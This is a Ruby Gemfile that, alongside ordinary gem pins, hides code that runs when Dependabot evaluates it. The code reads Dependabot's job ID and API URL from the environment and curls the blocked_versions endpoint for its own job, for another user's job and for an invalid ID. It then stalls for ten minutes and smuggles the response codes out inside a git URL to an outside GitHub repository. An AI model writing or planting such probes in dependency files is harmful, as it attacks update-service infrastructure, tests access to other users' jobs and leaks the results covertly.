source "https://rubygems.org"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
own_code = "000"
completed_code = "000"
invalid_code = "000"

begin
  require "open3"

  unless job_id.empty? || api_base.empty?
    own_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
    own_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", own_url
    )

    completed_url = "#{api_base}/update_jobs/1621545005/blocked_versions?package-manager=bundler"
    completed_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", completed_url
    )

    invalid_url = "#{api_base}/update_jobs/999999999999999999/blocked_versions?package-manager=bundler"
    invalid_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", invalid_url
    )

    sleep 600

    gem "dependabot-job-marker",
        git: "https://target-job-#{job_id}-own#{own_code}-done#{completed_code}-inv#{invalid_code}@github.com/chawdamrunal/probe-lab.git",
        branch: "main",
        require: false
  end
rescue Exception
  gem "erubi", "1.10.0"
end

gem "rack", "2.2.3"
gem "nokogiri", "1.13.0"
